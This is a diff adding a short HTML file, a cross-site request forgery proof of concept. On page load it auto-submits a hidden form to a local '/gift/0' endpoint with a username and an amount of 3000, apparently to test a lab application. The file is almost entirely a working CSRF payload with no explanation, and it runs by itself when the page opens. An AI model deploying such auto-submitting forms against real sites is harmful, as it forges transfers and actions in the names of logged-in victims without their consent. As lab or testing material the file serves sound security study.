@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <!-- Potential Cross-Site Request Forgery (CSRF) Trigger -->
+    <body onload="autoSubmitForm.submit()">
+        <!-- <script>history.pushState('', '', '/');</script> -->
+        <!-- <script>
+            document.forms[0].submit();
+        </script> -->
+
+        <form name="autoSubmitForm" action="http://127.0.0.1:8000/gift/0" method="get">
+            <input type="hidden" name="username" id="username" value="test2" />
+            <!-- <input type="hidden" name="password" value="test2" /> -->
+            <input type="hidden" name="amount" id="amount" value="3000" />
+        </form>
+
+    </body>
+</html>
+
